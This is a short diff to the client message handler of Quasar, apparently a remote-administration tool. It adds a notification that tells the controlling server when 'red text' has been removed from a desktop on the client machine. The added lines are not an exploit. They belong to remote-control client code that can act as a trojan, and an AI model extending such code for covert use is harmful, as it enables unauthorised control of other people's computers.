@@ -147,6 +147,10 @@ namespace Quasar.Client.Messages
                     {
                         client.Send(new NotifyMessageToServer { Message = string.Format("{0}", string.Format("Invisible text showed (on {0} desktop)!", strDesktop)) });
                     }
+                    if (flag7)
+                    {
+                        client.Send(new NotifyMessageToServer { Message = $"Removed Red Text on {strDesktop} desktop" });
+                    }
                     return;
                 }
                 catch (Exception ex16)
